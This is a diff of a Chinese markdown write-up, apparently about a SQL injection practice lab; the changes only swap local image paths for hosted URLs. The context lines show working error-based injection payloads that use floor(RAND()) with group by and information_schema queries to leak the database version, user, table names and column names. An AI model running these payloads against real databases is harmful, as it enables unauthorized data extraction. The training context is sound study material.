@@ -116,7 +116,7 @@ ERROR 1062 (23000): Duplicate entry '------1' for key 'group_key'
 ' union select 1, count(*),concat_ws('-', binary(@@version_compile_os), user(), version(),floor(RAND(0)*2))a from information_schema.tables group by a--+
 ```
 
-![all-info](C:\Users\kevin\AppData\Roaming\Typora\typora-user-images\1578314974609.png)
+![all-info](https://i.loli.net/2020/01/06/lpLwR2C8r6qvGcg.png)
 
 
 
@@ -132,7 +132,7 @@ ERROR 1062 (23000): Duplicate entry '------1' for key 'group_key'
 
 想起来，这种基于聚合函数的报错只能用 limit 一条一条看，那就改一下，一个一个查，查到三张表，`uagents`、`users` 、`emails` 和 `referers` 
 
-![tables](C:\Users\kevin\AppData\Roaming\Typora\typora-user-images\1578315709270.png)
+![tables](https://i.loli.net/2020/01/06/VZarthxO6PH1Ggi.png)
 
 
 
@@ -142,7 +142,7 @@ ERROR 1062 (23000): Duplicate entry '------1' for key 'group_key'
 ' union select 1, count(*),concat_ws('-', (select column_name from information_schema.columns where table_name='users' and table_schema='security' limit 1, 1), floor(RAND(0)*2))a from information_schema.tables where table_schema='security' group by a--+
 ```
 
-![column_name](C:\Users\kevin\AppData\Roaming\Typora\typora-user-images\1578317810619.png)
+![columns](https://i.loli.net/2020/01/06/tVY7xLiRfT2lKEq.png)
 
 
 
